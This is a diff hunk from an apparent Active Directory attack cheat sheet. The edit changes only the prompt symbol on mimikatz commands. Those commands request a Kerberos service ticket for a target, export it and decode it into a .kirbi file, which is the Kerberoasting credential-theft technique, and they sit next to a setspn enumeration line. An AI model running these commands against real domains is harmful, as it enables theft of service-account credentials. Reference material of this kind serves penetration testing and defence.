@@ -348,9 +348,9 @@ PS> setspn.exe -T domain -Q */* | Select-String '^CN' -Context 0,1 | % { New-Obj
 ```
 
 ```shell!
-mimikatz> kerberos::ask /target:cn # request TGS for cn
-mimikatz> base64 /out:true
-mimikatz> kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
+mimikatz# kerberos::ask /target:cn # request TGS for cn
+mimikatz# base64 /out:true
+mimikatz# kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
 ```
 
 ```shell!
